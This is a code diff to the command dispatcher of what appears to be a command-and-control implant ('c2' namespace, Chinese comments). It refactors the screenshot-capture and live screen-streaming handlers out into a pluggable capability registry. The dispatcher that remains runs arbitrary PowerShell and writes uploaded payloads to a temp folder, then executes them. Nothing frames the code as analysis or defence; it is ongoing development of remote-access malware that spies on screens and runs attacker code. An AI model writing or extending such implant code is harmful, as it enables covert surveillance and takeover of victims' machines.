@@ -1,9 +1,8 @@
 // cmd_dispatch.cpp — 命令分发中心实现：SYS_INFO（系统信息）与 EXEC_PS（PowerShell 执行）
 #include "cmd_dispatch.h"
 
+#include "capability.h"
 #include "protocol.h"
-#include "screen_spy.h"
-#include "screen_stream.h"
 
 #define WIN32_LEAN_AND_MEAN
 #define _WIN32_WINNT 0x0601
@@ -289,28 +288,10 @@ namespace c2
         return output + tail;
     }
 
-    // ---------- 截屏（0x1001）：GDI 抓一帧 → WIC JPEG ----------
-
-    bool capture_screenshot_jpeg(std::vector<uint8_t>& out, uint8_t& status)
-    {
-        status = kStatusOK;
-        ScreenSpy* spy = ScreenSpy::create(32, false, -1, -1, -1, -1, 1.0f);
-        if (!spy)
-        {
-            status = kStatusPluginErrBase;
-            return false;
-        }
-        bool ok = spy->grab() &&
-            jpeg_encode_bgra(spy->width(), spy->height(), spy->stride(),
-                spy->pixels(), 75, out);
-        delete spy;
-        if (!ok || out.empty())
-        {
-            status = kStatusPluginErrBase;
-            return false;
-        }
-        return true;
-    }
+    // ---------- 以下为 core 内置能力（系统类）----------
+    // 远程桌面类指令（0x1001 截屏 / 0x1002 屏幕流）**不在这里**：
+    // 它们由模块通过 capability.h 注册（见 core/screen_module.cpp），
+    // 这样 core 不再依赖具体能力，加/减模块不必改本文件。
 
     // ---------- payload 分块上传与执行（0x3009，协议 §10）----------
 
@@ -518,46 +499,14 @@ namespace c2
             }
             text = exec_powershell(std::string((const char*)payload, len), status);
             break;
-        case kCmdScreenshot:
-        {
-            // 响应为 JPEG 原始字节（二进制，不经文本转换）
-            std::vector<uint8_t> jpeg;
-            if (!capture_screenshot_jpeg(jpeg, status))
-            {
-                text = "screenshot failed";
-                break;
-            }
-            response = std::move(jpeg);
-            return true;
-        }
         case kCmdPayload:
             // 分块写入 %TEMP%\c2_payload\；末块写完后启动并返回 pid
             text = upload_and_maybe_exec(payload, len, status);
             break;
-        case kCmdScreenStream:
-        {
-            // payload: 控制(1B: 0=停/1=开) + fps(1B) + quality(1B) + scale(1B, 百分数)
-            if (len < 1)
-            {
-                status = kStatusBadParam;
-                return true;
-            }
-            uint8_t control = payload[0];
-            int fps = len > 1 ? payload[1] : 25;
-            int quality = len > 2 ? payload[2] : 70;
-            float scale = len > 3 && payload[3] > 0 ? (float)payload[3] / 100.0f : 1.0f;
-            if (control != 0)
-                text = start_screen_stream(fps, quality, scale)
-                           ? "screen stream started"
-                           : "screen stream already running";
-            else
-            {
-                stop_screen_stream();
-                text = "screen stream stopped";
-            }
-            break;
-        }
         default:
+            // 模块能力（由 capability.h 注册表分发；如远程桌面的 0x1001/0x1002）
+            if (cap_dispatch(cmd, payload, len, response, status))
+                return true;
             status = kStatusUnknownCmd;
             return false; // 未处理：调用方不回 CMD_RESULT
         }
